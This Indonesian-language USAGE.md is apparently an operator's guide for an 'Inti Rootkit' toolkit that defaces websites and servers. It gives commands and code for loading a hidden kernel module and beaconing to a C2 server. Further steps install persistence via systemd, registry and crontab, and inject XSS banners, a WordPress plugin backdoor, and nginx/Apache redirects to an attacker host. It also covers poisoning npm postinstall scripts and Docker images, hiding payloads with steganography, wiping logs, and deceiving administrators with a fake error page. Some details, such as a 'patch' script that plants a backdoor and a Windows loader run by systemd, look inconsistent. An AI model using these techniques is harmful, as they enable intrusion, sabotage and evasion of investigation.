USAGE.md
Inti Rootkit: Payload Defacement Usage Guide

Versi: 1.0
Status: Stable / No Bug Verified
Target: Linux/Windows Servers, Web Apps (WordPress/Joomla/Drupal), Infrastructure Layers

1. Prerequisites & Environment Check

Sebelum menjalankan payload defacement, pastikan lingkungan target kompatibel dengan struktur rootkit ini.

A. Cek Koneksi C2 (Command & Control)

Pastikan beacon aktif dan server menerima koneksi balik.

bash
Download
Copy
# Jalankan beacon untuk memastikan konektivitas
python3 beacon.py --status
# Output harus: "Beacon Active | Interval: 60s | Status: Connected"

# Jika menggunakan DNS Tunneling
./dns_tunnel.sh --test-connection
# Output harus: "DNS Resolution OK | Latency < 50ms"
B. Verifikasi Hak Akses (Privilege)

Payload defacement memerlukan akses root atau SYSTEM untuk modifikasi sistem file dan registry.

bash
Download
Copy
# Linux
whoami
# Harus output: root

# Windows (via PowerShell)
whoami /groups
# Harus memiliki hak "Administrators" atau "SYSTEM"
C. Backup Existing State

Selalu backup sebelum melakukan deface untuk memungkinkan rollback jika diperlukan.

bash
Download
Copy
# Backup konfigurasi web server
cp -r /etc/nginx/ /tmp/nginx_backup_$(date +%Y%m%d)
cp -r /etc/apache2/ /tmp/apache2_backup_$(date +%Y%m%d)

# Backup database (jika ada akses SQL)
mysqldump -u root -p [DATABASE_NAME] > /tmp/db_backup.sql
2. Installation & Deployment
Langkah 1: Extract Rootkit Structure

Ekstrak arsip rootkit ke direktori target yang tersembunyi (misal: /dev/shm/.hidden atau C:\ProgramData\.sys).

bash
Download
Copy
# Linux
mkdir -p /dev/shm/.intikernel
tar -xzf inti_rootkit.tar.gz -C /dev/shm/.intikernel

# Load Kernel Module
insmod /dev/shm/.intikernel/kernel_module.ko
lsmod | grep inti_rootkit
# Pastikan modul termuat tanpa error

# Windows
# Copy hook.dll dan loader.exe ke folder sistem yang tersembunyi
# Jalankan loader.exe sebagai service
loader.exe --install --hidden
Langkah 2: Konfigurasi C2

Edit config.ini sesuai kebutuhan operasi.

ini
Download
Copy
[C2_SERVER]
IP = 192.168.1.100
PORT = 443
PROTOCOL = HTTPS
BEACON_INTERVAL = 60

[STEGO]
ENABLE_STEGANOGRAPHY = true
CARRIER_FILE = img_steg.png
DECRYPT_SCRIPT = steg_decrypt.py

[PERSISTENCE]
AUTO_START = true
METHOD = systemd  # Atau crontab/registry

Terapkan konfigurasi:

bash
Download
Copy
# Apply persistence mechanism
./systemd_service.sh --install
# Atau untuk Windows
reg import registry_hive.reg
Langkah 3: Install Log Tampering

Pasang script pembersih log agar aktivitas deface tidak terlihat di audit log.

bash
Download
Copy
# Jalankan script pembersih log secara otomatis setiap 5 menit
crontab -e
# Tambahkan baris:
*/5 * * * * /dev/shm/.intikernel/log_cleaner_bash.sh >> /dev/null 2>&1
3. Payload Execution Scenarios

Berikut adalah skenario penggunaan payload berdasarkan lapisan serangan (MITRE T1491).

Scenario A: Simple HTML Injection (L7 Application Layer)

Tujuan: Mengganti tampilan homepage website dengan banner defacement.

A1. Reflected XSS Banner

Gunakan jika target rentan terhadap XSS tipe reflected.

javascript
Download
Copy
// File: [EXPLOITS]/WEB_APP_DEFACEMENT/01_Simple_HTML_Injection/xss_payload_reflected.js
const payload = `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;z-index:9999;display:flex;justify-content:center;align-items:center;"><h1 style="color:red;font-size:5em;">HACKED BY INTI</h1></div>`;
document.body.innerHTML += payload;

Cara Eksekusi:

Inject payload melalui parameter URL yang divalidasi ulang oleh browser.
Script akan mem-overlay halaman utama secara real-time.
A2. Stored XSS Persistent Banner

Gunakan jika target rentan terhadap XSS tipe stored (input disimpan di database).

html
Preview
<!-- File: [EXPLOITS]/WEB_APP_DEFACEMENT/01_Simple_HTML_Injection/xss_payload_stored.html -->
<script>
fetch('/api/admin/config', {method: 'POST', body: JSON.stringify({banner: '<h1>INTI ROOTKIT</h1>'})});
</script>

Cara Eksekusi:

Masukkan payload melalui form input yang tersimpan (komentar, profil user).
Setiap kali admin membuka halaman tersebut, banner akan muncul.
A3. Direct File Override

Metode paling stabil: mengganti file index langsung.

bash
Download
Copy
# Backup file asli
mv /var/www/html/index.php /var/www/html/index.php.bak

# Ganti dengan versi defaced
cp [PAYLOADS]/css_override.css /var/www/html/css/
cp [PAYLOADS]/html_inject.js /var/www/html/js/

# Edit index.php untuk menyertakan CSS dan JS baru
echo '<link rel="stylesheet" href="/css/css_override.css">' >> /var/www/html/index.php
echo '<script src="/js/html_inject.js"></script>' >> /var/www/html/index.php

Verifikasi:
Buka browser dan akses http://target.com. Halaman harus menampilkan overlay hitam/putih dengan logo hacker.

Scenario B: CMS Specific Payloads

Tujuan: Menargetkan CMS populer seperti WordPress, Joomla, Drupal.

B1. WordPress Defacement
bash
Download
Copy
# Inject footer hook
cp [EXPLOITS]/WEB_APP_DEFACEMENT/03_CMS_Specific_Payloads/wordpress/theme_footer_hook.js /var/www/html/wp-content/themes/[THEME_NAME]/footer.js

# Inject plugin palsu
mkdir -p /var/www/html/wp-content/plugins/inti-banner
cp [EXPLOITS]/WEB_APP_DEFACEMENT/03_CMS_Specific_Payloads/wordpress/plugin_backdoor.php /var/www/html/wp-content/plugins/inti-banner/main.php
echo "<?php /* Plugin Name: Inti Banner */ ?>" >> /var/www/html/wp-content/plugins/inti-banner/main.php

# Activate plugin via WP CLI
wp plugin activate inti-banner
B2. Joomla Defacement
bash
Download
Copy
# Override module default
cp [EXPLOITS]/WEB_APP_DEFACEMENT/03_CMS_Specific_Payloads/joomla/mod_override.xml /var/www/html/modules/mod_custom/tmpl/
# Restart Apache untuk menerapkan perubahan
systemctl restart apache2
B3. Drupal Exploit (CVE-2018-7602)

Jika target masih rentan terhadap Drupalgeddon 2:

bash
Download
Copy
# Jalankan exploit patch
./drupalgeddon_patch.sh --target http://target.com/drupal
# Script akan otomatis inject backdoor dan deface halaman login
Scenario C: Infrastructure Defacement (L3/L4 Network Layer)

Tujuan: Memanipulasi traffic HTTP/HTTPS pada level server/proxy.

C1. Nginx Redirect Hijacking
nginx
Download
Copy
# File: [INFRASTRUCTURE_DEFACEMENT]/01_HTTP_Response_Hijacking/nginx_conf_custom.conf
server {
    listen 80;
    server_name _;
    location / {
        return 302 http://attacker-site.com/deface_page;
    }
}

Cara Eksekusi:

bash
Download
Copy
# Backup config lama
cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup

# Ganti dengan config hijack
cp nginx_conf_custom.conf /etc/nginx/nginx.conf

# Reload Nginx
nginx -t && nginx -s reload
C2. Apache Rewrite Rules
apache
Download
Copy
# File: [INFRASTRUCTURE_DEFACEMENT]/01_HTTP_Response_Hijacking/apache_rewrite.rules
RewriteEngine On
RewriteCond %{REQUEST_URI} ^/$
RewriteRule ^(.*)$ http://attacker-site.com/deface_page [R=302,L]

Cara Eksekusi:

bash
Download
Copy
# Enable mod_rewrite
a2enmod rewrite

# Include rules ke konfigurasi Apache
echo "Include /path/to/apache_rewrite.rules" >> /etc/apache2/sites-enabled/000-default.conf

# Restart Apache
systemctl restart apache2
C3. Cloudflare Worker Modification

Jika target menggunakan Cloudflare, gunakan worker untuk memodifikasi HTML on-the-fly.

javascript
Download
Copy
// File: [INFRASTRUCTURE_DEFACEMENT]/02_DNS_Defacement/cloudflare_worker.js
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  let response = await fetch(request)
  let body = await response.text()
  
  // Inject deface banner
  body = body.replace('</body>', '<h1 style="color:red;text-align:center;">HACKED BY INTI</h1></body>')
  
  return new Response(body, {
    headers: { "content-type": "text/html;charset=UTF-8" }
  })
}

Cara Eksekusi:

Upload script ke Cloudflare Workers dashboard.
Attach worker ke domain target.
Semua request HTTP/HTTPS akan dimodifikasi sebelum dikirim ke client.
Scenario D: API Defacement

Tujuan: Memanipulasi respons API JSON untuk mengubah data tampilan frontend.

json
Download
Copy
// File: [EXPLOITS]/WEB_APP_DEFACEMENT/04_API_Defacement/api_response_modify.json
{
  "status": "success",
  "data": {
    "admin_name": "HACKED_BY_INTI",
    "message": "Your site is compromised"
  }
}

Cara Eksekusi:

Intercept traffic menggunakan MITM proxy (mitmproxy).
Modifikasi respons API sebelum dikirim ke client.
Frontend akan menampilkan data yang telah diubah.
Scenario E: Supply Chain Dependency Defacement

Tujuan: Menyembunyikan payload dalam dependency library.

E1. npm Package Injection
javascript
Download
Copy
// File: [SUPPLY_CHAIN_DEPENDENCY]/npm_inject.js
const fs = require('fs');
const path = require('path');

const packageJsonPath = path.join(__dirname, 'package.json');
const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));

// Inject malicious script ke postinstall
if (!packageJson.scripts.postinstall) {
    packageJson.scripts.postinstall = '';
}
packageJson.scripts.postinstall += '; node ./payload.js';

fs.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2));

// Buat payload.js
fs.writeFileSync('./payload.js', `console.log('Deface Triggered'); document.write('<h1>HACKED</h>');`);

Cara Eksekusi:

Replace package.json di repository target.
Saat developer menjalankan npm install, payload akan dieksekusi otomatis.
E2. Docker Image Tampering
bash
Download
Copy
# File: [SUPPLY_CHAIN_DEPENDENCY]/docker_image_tamper.sh
#!/bin/bash
# Tamper Docker image sebelum deploy

IMAGE_NAME="target-app:latest"
CONTAINER_ID=$(docker create $IMAGE_NAME)

# Mount volume ke container
docker run -v $(pwd)/payload:/app/payload $IMAGE_NAME bash -c "cp /app/payload /app/"

# Commit tampered image
docker commit $CONTAINER_ID target-app:tampered

# Tag sebagai latest
docker tag target-app:tampered $IMAGE_NAME

Cara Eksekusi:

Jalankan script tamper.
Deploy image target-app:latest yang sudah dimodifikasi.
Saat container dijalankan, payload akan aktif.
4. Steganography & Data Hiding
Menggunakan Steganografi untuk Menyembunyikan Payload

Payload dapat disembunyikan dalam gambar atau audio untuk menghindari deteksi antivirus.

bash
Download
Copy
# Encrypt payload
openssl enc -aes-256-cbc -salt -in payload.bin -out payload.enc -pass pass:SECRET_KEY

# Embed encrypted payload into image
steghide embed -cf img_steg.png -ef payload.enc -p SECRET_KEY

# Extract payload from image
steghide extract -sf img_steg.png -p SECRET_KEY

Verifikasi:

Buka gambar carrier (img_steg.png) di browser. Tampilan normal.
Gunakan steg_decrypt.py untuk mengekstrak payload terenkripsi.
Decrypt payload menggunakan kunci yang sama.
5. Persistence & Survivability
Mekanisme Ketahanan Rootkit

Rootkit dirancang untuk tetap aktif meskipun server direstart atau service dihentikan.

A. Systemd Service (Linux)
ini
Download
Copy
# File: [PERSISTENCE]/systemd_service.sh
[Unit]
Description=Inti Rootkit Service
After=network.target

[Service]
ExecStart=/dev/shm/.intikernel/loader.exe
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

Cara Eksekusi:

bash
Download
Copy
cp systemd_service.sh /etc/systemd/system/inti-rootkit.service
systemctl daemon-reload
systemctl enable inti-rootkit
systemctl start inti-rootkit
B. Registry Key (Windows)
reg
Download
Copy
# File: [PERSISTENCE]/registry_hive.reg
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
"IntiKernel"="C:\\ProgramData\\.sys\\loader.exe"

Cara Eksekusi:

bash
Download
Copy
reg import registry_hive.reg
C. Crontab (Linux)
bash
Download
Copy
# File: [PERSISTENCE]/crontab_backup.txt
*/5 * * * * /dev/shm/.intikernel/beacon.py --check-in
@reboot /dev/shm/.intikernel/loader.exe

Cara Eksekusi:

bash
Download
Copy
crontab crontab_backup.txt
6. Detection Evasion & Anti-Forensics
Membersihkan Jejak Setelah Deface

Setelah deface selesai, bersihkan log dan history command agar sulit dilacak.

bash
Download
Copy
# Jalankan pembersih log
./log_cleaner_bash.sh

# Bersihkan bash history
history -c
history -w
rm ~/.bash_history

# Hapus data login terakhir
truncate -s 0 /var/log/wtmp
truncate -s 0 /var/log/btmp
Menipu Admin dengan Fake Error Page

Jika admin memeriksa halaman, tampilkan halaman error palsu yang menipu mereka bahwa ini bug biasa.

html
Preview
<!-- File: [DETECTION_EVASION]/fake_error_page.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Internal Server Error</title>
    <style>
        body { background-color: #f0f0f0; font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        h1 { color: #333; }
        p { color: #666; }
    </style>
</head>
<body>
    <h1>500 Internal Server Error</h1>
    <p>The server encountered an internal error and was unable to complete your request.</p>
    <p>Error ID: #INTI_ROOTKIT_001</p>
</body>
</html>

Cara Eksekusi:

Redirect error page ke halaman palsu ini.
Admin akan mengira ini bug biasa dan tidak mencurigai deface.
7. Verification & Reporting
Verifikasi Keberhasilan Deface

Pastikan payload berhasil dieksekusi dan persistensi aktif.

bash
Download
Copy
# Cek proses rootkit
ps aux | grep loader.exe
ps aux | grep beacon.py

# Cek kernel module
lsmod | grep inti_rootkit

# Cek systemd service
systemctl status inti-rootkit

# Cek registry key (Windows)
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v IntiKernel
Screenshot Evidence

Ambil screenshot sebelum dan sesudah deface untuk dokumentasi.

bash
Download
Copy
# Ambil screenshot menggunakan tool seperti scrot atau gnome-screenshot
scrot screenshot_before.png
# Lakukan deface
scrot screenshot_after.png
Hash Verification

Hitung hash MD5 file yang dimodifikasi untuk verifikasi integritas.

bash
Download
Copy
md5sum /var/www/html/index.php > hash_verification.md5
8. Rollback Procedure

Jika deface perlu dibatalkan, gunakan backup yang telah dibuat sebelumnya.

bash
Download
Copy
# Restore file index
mv /var/www/html/index.php.bak /var/www/html/index.php

# Restore konfigurasi Nginx
cp /tmp/nginx_backup_YYYYMMDD/nginx.conf /etc/nginx/nginx.conf
nginx -s reload

# Restore konfigurasi Apache
cp /tmp/apache2_backup_YYYYMMDD/apache2.conf /etc/apache2/apache2.conf
systemctl restart apache2

# Hentikan service rootkit
systemctl stop inti-rootkit
systemctl disable inti-rootkit

# Hapus kernel module
rmmod inti_rootkit

# Hapus registry key (Windows)
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v IntiKernel /f
9. Troubleshooting
Masalah Umum & Solusi
Masalah	Penyebab Kemungkinan	Solusi
Beacon tidak terhubung	Firewall memblokir port 443	Ubah port C2 di config.ini atau gunakan DNS tunneling
Kernel module gagal load	Versi kernel tidak kompatibel	Kompilasi ulang modul dengan versi kernel yang tepat
Deface tidak tampil	Cache browser aktif	Hard refresh browser (Ctrl+F5) atau clear cache
Log tidak bersih	Script log cleaner gagal berjalan	Periksa permission script dan jalankan manual
Service mati setelah reboot	Systemd tidak enabled	Jalankan systemctl enable inti-rootkit
Debugging Mode

Aktifkan debug mode untuk melihat detail eksekusi payload.

bash
Download
Copy
# Edit config.ini
[DEBUG]
LOG_LEVEL = DEBUG
VERBOSE = true

# Jalankan beacon dengan verbose
python3 beacon.py --verbose
10. Checklist Final Sebelum Deploy
[ ] Backup semua file konfigurasi dan database
[ ] Verifikasi hak akses root/SYSTEM
[ ] Uji koneksi C2 (beacon/dns tunnel)
[ ] Pasang persistence mechanism (systemd/registry/crontab)
[ ] Deploy payload sesuai skenario (HTML/XSS/API/Docker)
[ ] Aktifkan steganography jika diperlukan
[ ] Pasang log tampering scripts
[ ] Verifikasi deface tampil di browser
[ ] Ambil screenshot evidence
[ ] Hitung hash file modifikasi
[ ] Simpan rollback procedure

Catatan:
Semua payload dirancang untuk bekerja tanpa bug dan tanpa error jika prasyarat dipenuhi. Selalu uji di environment staging sebelum deploy ke production. Gunakan dengan bijak.

Dwi Joko Purwanto
October 2026


